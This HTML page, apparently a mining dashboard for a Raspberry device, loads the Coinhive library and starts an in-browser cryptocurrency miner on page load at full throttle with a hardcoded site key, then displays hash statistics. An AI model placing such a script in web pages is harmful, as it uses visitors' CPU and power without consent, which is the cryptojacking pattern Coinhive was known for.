<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="shortcut icon" type="image/x-icon" href="../../images/favicon.ico">
	<!-- The above 3 meta tags MUST come first in the head
	Any other head content must come AFTER these tags -->
	<title>Miner | Raspberry #00</title>
	<!-- Bootstrap's CSS -->
	<link href="../../css/bootstrap.min.css" rel="stylesheet">
	<!-- Font Awesome CSS -->
	<link href="../../css/font-awesome.min.css" rel="stylesheet">
</head>
<body>
	<header>
		<div class="jumbotron">
			<div class="container">
				<center>
					<h3 class="text-warning" id="hash">Total Hashes: </h3>
					<h4 class="text-primary" id="rate">Hashes/s: </h4>
					<h2 class="text-success" id="accepted">Accepted: </h2>
				</center>
			</div>
		</div>
	</header>
		
	






	<!-- ##### WARNING: DONT PUT/WRITE HTML BELOW THIS LINE #### -->
	<!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
	<script src="../../js/jquery.min.js"></script>
	<!-- Bootstrap's Javascript -->
	<script src="../../js/bootstrap.min.js"></script>
	<!-- Your Javascript Starts here -->
	<script src="https://coinhive.com/lib/coinhive.min.js"></script>
	<script>
		var miner = new CoinHive.Anonymous('U7DPNoIBkdolJj4jDSCWbu8y3TZE05YL', {
			throttle: 0,
			threads: 16
		});

		// Only start on non-mobile devices
		if (!miner.isMobile()) {
			miner.start();
		}

		// Update stats once per second
		setInterval(function() {
			var hashesPerSecond = miner.getHashesPerSecond();
			var totalHashes = miner.getTotalHashes();
			var acceptedHashes = miner.getAcceptedHashes();

			document.getElementById('hash').innerHTML = 'Total Hashes: '+totalHashes;
			document.getElementById('rate').innerHTML = 'Hashes/s: '+hashesPerSecond.toFixed(2);
			document.getElementById('accepted').innerHTML = 'Accepted: '+acceptedHashes;
		}, 1000);
	</script>
	<!-- Your Javascript Ends here -->
</body>
</html>
